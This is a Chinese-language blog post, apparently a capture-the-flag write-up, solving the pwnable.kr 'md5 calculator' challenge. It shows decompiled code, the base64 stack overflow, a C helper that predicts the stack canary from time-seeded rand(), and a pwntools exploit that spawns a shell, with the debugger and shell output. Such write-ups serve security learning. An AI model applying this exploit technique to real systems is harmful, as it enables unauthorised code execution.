@@ -1,0 +1,255 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>md5 caculator Writeup[pwnable.kr] | WeaponX&#39;s Blog</title>
+  <meta name="author" content="WeaponX">
+  
+  <meta name="description" content="Vulnerability|Security|Binary">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="md5 caculator Writeup[pwnable.kr]"/>
+  <meta property="og:site_name" content="WeaponX&#39;s Blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="WeaponX&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?ab50f379bb6434641ee0125ce5d37f23";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  <script>
+  (function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+   })();
+   </script>
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">WeaponX&#39;s Blog</a></h1>
+  <h2><a href="/">Binary</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2017-03-03T08:52:11.000Z"><a href="/2017/03/03/md5-caculator-Writeup-pwnable-kr/">2017-03-03</a></time>
+      
+      
+  
+    <h1 class="title">md5 caculator Writeup[pwnable.kr]</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="0x00-md5-caculater"><a href="#0x00-md5-caculater" class="headerlink" title="0x00 md5 caculater"></a>0x00 md5 caculater</h2><p>下载下来直接运行，提示缺<code>libcrypto</code>库，但是我却安装过了<code>openssl</code>。于是在lib下看，确实是没有这个库。因为我的环境是<code>ubuntu x86_64</code>装的<code>openssl</code>也是64位的，所以要安装32位的库，使用这个命令:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">sudo apt-get install --reinstall libssl1.0.0:i386</div></pre></td></tr></table></figure>
+<p>安装好后反汇编一下，程序很简单。先生成一个随机数token，输入的值和随机数token相等则再输入一串base64编码后的文本，将这个文本解密后用md5加密打印。</p>
+<a id="more"></a>
+<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>程序的漏洞比较明显，在<code>process_hash</code>函数这。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">process_hash</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST14_4@3</span></div><div class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// ST18_4@3</span></div><div class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+1Ch] [bp-20Ch]@1</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+21Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</div><div class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</div><div class="line">    ;</div><div class="line">  <span class="built_in">memset</span>(g_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_buf));</div><div class="line">  fgets(g_buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</div><div class="line">  v0 = Base64Decode(g_buf, &amp;v3);</div><div class="line">  ptr = (<span class="keyword">void</span> *)calc_md5(&amp;v3, v0);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"MD5(data) : %s\n"</span>, ptr);</div><div class="line">  <span class="built_in">free</span>(ptr);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>其中<code>g_buf</code>是全局变量1024字节，存放base64编码后的文本。<code>v3</code>是局部变量512字节，存放解码后的文本。</p>
+<blockquote>
+<p>Base64是把3个字节变为4个字节，所以，Base64编码的长度永远是4的倍数</p>
+</blockquote>
+<p>所以1024字节的base64解码后为<code>1024/4*3=768</code>。而程序只分配的512字节，所以会出现缓冲区溢出。</p>
+<p>然而，程序开启了<code>stack canary</code>，需要我们绕过。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0x0 </div><div class="line">EBX: 0xffffd40c (<span class="string">'a'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...)</div><div class="line">ECX: 0x0 </div><div class="line">EDX: 0xf7dcf434 --&gt; 0x804c020 --&gt; 0x3a9 </div><div class="line">ESI: 0x0 </div><div class="line">EDI: 0xffffd60c (<span class="string">'a'</span> &lt;repeats 188 <span class="built_in">times</span>&gt;)</div><div class="line">EBP: 0xffffd618 (<span class="string">'a'</span> &lt;repeats 176 <span class="built_in">times</span>&gt;)</div><div class="line">ESP: 0xffffd3f0 --&gt; 0x0 </div><div class="line">EIP: 0x8049074 (&lt;process_hash+226&gt;: mov    eax,DWORD PTR [ebp-0xc])</div><div class="line">EFLAGS: 0x200282 (carry parity adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x8049066 &lt;process_hash+212&gt;:    mov    eax,DWORD PTR [ebp-0x210]</div><div class="line">   0x804906c &lt;process_hash+218&gt;:    mov    DWORD PTR [esp],eax</div><div class="line">   0x804906f &lt;process_hash+221&gt;:    call   0x8048900 &lt;free@plt&gt;</div><div class="line">=&gt; 0x8049074 &lt;process_hash+226&gt;:    mov    eax,DWORD PTR [ebp-0xc]</div><div class="line">   0x8049077 &lt;process_hash+229&gt;:    xor    eax,DWORD PTR gs:0x14</div><div class="line">   0x804907e &lt;process_hash+236&gt;:    je     0x8049085 &lt;process_hash+243&gt;</div><div class="line">   0x8049080 &lt;process_hash+238&gt;:    call   0x8048990 &lt;__stack_chk_fail@plt&gt;</div><div class="line">   0x8049085 &lt;process_hash+243&gt;:    add    esp,0x220</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd3f0 --&gt; 0x0 </div><div class="line">0004| 0xffffd3f4 --&gt; 0x804c028 --&gt; 0x0 </div><div class="line">0008| 0xffffd3f8 --&gt; 0xf7dcfc20 --&gt; 0xfbad2288 </div><div class="line">0012| 0xffffd3<span class="built_in">fc</span> --&gt; 0xf7c71a97 (&lt;_IO_vfscanf+1399&gt;:    movzx  ecx,BYTE PTR [ebp-0x15c])</div><div class="line">0016| 0xffffd400 --&gt; 0xf7dcfc20 --&gt; 0xfbad2288 </div><div class="line">0020| 0xffffd404 --&gt; 0x2be </div><div class="line">0024| 0xffffd408 --&gt; 0x804c028 --&gt; 0x0 </div><div class="line">0028| 0xffffd40c (<span class="string">'a'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">0x08049074 <span class="keyword">in</span> process_hash ()</div><div class="line">gdb-peda$ p <span class="variable">$ebp</span>-0xc</div><div class="line"><span class="variable">$1</span> = (void *) 0xffffd60c</div><div class="line">gdb-peda$ shell</div><div class="line">------------------------------------------------------------</div><div class="line">~/pwn/pwnkr/md5_caculater » python</div><div class="line">Python 2.7.6 (default, Oct 26 2016, 20:30:19) </div><div class="line">[GCC 4.8.4] on linux2</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; hex(0xffffd60c-0xffffd40c)</div><div class="line"><span class="string">'0x200'</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure>
+<p>可见，0x200字节就覆盖了canary。需要绕过这个canary，首先想到了<code>Memory Leak</code>。但是，程序不存在格式化字符串漏洞；又想能否使用BROP，这个程序是用socat启动的，程序挂了后肯定会rerandom，所以还是不行。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_hash</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx@4</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+0h] [bp-38h]@1</span></div><div class="line">  <span class="keyword">char</span> v3[<span class="number">32</span>]; <span class="comment">// [sp+Ch] [bp-2Ch]@2</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+10h] [bp-28h]@4</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+14h] [bp-24h]@4</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+18h] [bp-20h]@4</span></div><div class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+1Ch] [bp-1Ch]@4</span></div><div class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+20h] [bp-18h]@4</span></div><div class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+24h] [bp-14h]@4</span></div><div class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+28h] [bp-10h]@4</span></div><div class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+2Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v11 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</div><div class="line">    *(_DWORD *)&amp;v3[<span class="number">4</span> * i] = rand();</div><div class="line">  result = v7 - v9 + v10 + v11 + v5 - v6 + v4 + v8;</div><div class="line">  v1 = *MK_FP(__GS__, <span class="number">20</span>) ^ v11;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>看到了这个函数，其中<code>v11</code>为cancary，只要我们知道随机数，就可以逆推出canary的值。我们找到了随机数的种子为<code>time(0)</code>就是当前系统的时间戳。</p>
+<p>这样就好办了，写一个程序来根据token算canary。因为目标程序是用socat启动的，所以当有程序连上目标端口就会启动这个程序，我们得到token后传入我们写的程序。这时候时间戳应该是一样的，根据这个token就可以算出canary。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n[<span class="number">8</span>], i;</div><div class="line">    <span class="keyword">int</span> token = atoi(argv[<span class="number">1</span>]);</div><div class="line">    <span class="keyword">int</span> cookie;</div><div class="line">    srand(time(<span class="number">0</span>));</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</div><div class="line">    &#123;</div><div class="line">        n[i]=rand();</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// v[4]-v[6]+v[7]+cookie+v[2]-v[3]+v[1]+[5]=token</span></div><div class="line">    cookie = token-n[<span class="number">5</span>]-n[<span class="number">1</span>]+n[<span class="number">3</span>]-n[<span class="number">2</span>]-n[<span class="number">7</span>]+n[<span class="number">6</span>]-n[<span class="number">4</span>];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>,cookie);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>因为<code>system</code>有了，所以我们需要一个<code>/bin/sh</code>的地址来完成函数调用，这个也比较好解决。因为有一个全局变量，我们把<code>/bin/sh</code>放到全局变量里即可，所以exploit如下:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line"></div><div class="line"><span class="comment">#io = process("./hash")</span></div><div class="line">io = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</div><div class="line">io.recvuntil(<span class="string">"Are you human? input captcha : "</span>)</div><div class="line">token = io.recv()</div><div class="line"></div><div class="line"></div><div class="line">io.send(token)</div><div class="line">cookie = os.popen(<span class="string">"./x "</span>+token).read()</div><div class="line">cookie = int(cookie, <span class="number">16</span>)</div><div class="line">log.success(<span class="string">"Canary =&gt; [&#123;&#125;]"</span>.format(hex(cookie)))</div><div class="line">payload = <span class="string">"A"</span> * <span class="number">0x200</span> + p32(cookie) + <span class="string">"B"</span> * <span class="number">12</span> + p64(<span class="number">0x8048880</span>) + p64(<span class="number">0x804b3c0</span>) + <span class="string">"/bin/sh\x00"</span></div><div class="line">payload = b64encode(payload) + <span class="string">"/bin/sh\x00"</span></div><div class="line"></div><div class="line">raw_input()</div><div class="line">io.sendline(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">tiny_easy@ubuntu:/tmp$ python xxx.py</div><div class="line">[+] Opening connection to 127.0.0.1 on port 9002: Done</div><div class="line">[+] Canary =&gt; [0xf5905a00]</div><div class="line"></div><div class="line">[*] Switching to interactive mode</div><div class="line">Welcome! you are authenticated.</div><div class="line">Encode your data with BASE64 <span class="keyword">then</span> paste me!</div><div class="line">MD5(data) : a703c1b84424ff5c8e2f6c5569f3151a</div><div class="line">$ ls</div><div class="line">flag</div><div class="line"><span class="built_in">log</span></div><div class="line"><span class="built_in">log</span>2</div><div class="line">md5calculator</div><div class="line">super.pl</div><div class="line">$ cat flag</div><div class="line">Canary, Stack guard, Stack protector.. what is the correct expression?</div></pre></td></tr></table></figure>
+<h2 id="0x02-Refer"><a href="#0x02-Refer" class="headerlink" title="0x02 Refer"></a>0x02 Refer</h2><p><a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001399413803339f4bbda5c01fc479cbea98b1387390748000" target="_blank" rel="external">http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001399413803339f4bbda5c01fc479cbea98b1387390748000</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+          <p style="border-top: #e0e0e0 1px dashed; border-right: #e0e0e0 1px dashed; border-bottom: #e0e0e0 1px dashed; border-left: #e0e0e0 1px dashed; padding-top: 10px;padding-right: 10px;padding-bottom: 10px;padding-left: 110px; background: url(http://i.creativecommons.org/l/by-nc-sa/2.5/cn/88x31.png) #e5f1f4 no-repeat 1% 50%; font-family: 微软雅黑; font-size:11px;" id="PSignature">  
+作者：<a href="http://weaponx.site">WeaponX</a>
+<br>出处：<a href="http://weaponx.site/2017/03/03/md5-caculator-Writeup-pwnable-kr/">http://weaponx.site/2017/03/03/md5-caculator-Writeup-pwnable-kr/</a>           
+<br>本文采用<a href="http://creativecommons.org/licenses/by-nc-sa/2.5/cn/" rel="license">知识共享署名-非商业性使用-相同方式共享 2.5 中国大陆许可协议</a>进行许可，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接。
+</p>
+
+        
+        
+  
+  <div class="categories">
+    <a href="/categories/tech/">技术</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/安全/">安全</a>, <a href="/tags/pwn/">pwn</a>
+  </div>
+
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">留言</h1>
+
+  
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+  
+</section>
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="搜索">
+    <input type="hidden" name="q" value="site:weaponx.site">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/tech/">技术</a><small>15</small></li>
+  
+    <li><a href="/categories/life/">生活</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">标签</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/Django/">Django</a><small>1</small></li>
+  
+    <li><a href="/tags/Hexo/">Hexo</a><small>4</small></li>
+  
+    <li><a href="/tags/pwn/">pwn</a><small>7</small></li>
+  
+    <li><a href="/tags/python/">python</a><small>1</small></li>
+  
+    <li><a href="/tags/博客/">博客</a><small>3</small></li>
+  
+    <li><a href="/tags/安全/">安全</a><small>11</small></li>
+  
+    <li><a href="/tags/影评/">影评</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">友情链接</h3>
+  <ul class="entry">
+  
+    <li><a href="http://www.cnblogs.com/goabout2/" title="goabout2">goabout2</a></li>
+  
+    <li><a href="http://rootkiter.com/" title="RootKiter">RootKiter</a></li>
+  
+  </ul>
+</div>
+
+
+
+  <div class="widget tag">
+  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=270 height=86 src="//music.163.com/outchain/player?type=2&id=427542287&auto=0&height=66"></iframe>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2017 WeaponX
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="http://apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<script type="text/javascript">
+var disqus_shortname = 'weaponx';
+
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+</body>
+</html>
